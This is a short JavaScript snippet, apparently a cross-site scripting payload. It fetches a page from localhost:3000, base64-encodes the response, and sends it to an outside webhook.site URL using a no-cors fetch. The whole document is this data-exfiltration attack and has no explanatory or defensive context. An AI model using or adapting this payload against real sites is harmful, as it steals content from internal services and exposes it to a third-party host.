xhr.open("GET", "http://localhost:3000");
xhr.onload = () => fetch("https://webhook.site/fef28452-dc88-40ae-ac06-5481ac42f7ff" + btoa(xhr.responseText), {mode: "no-cors"});
xhr.send();
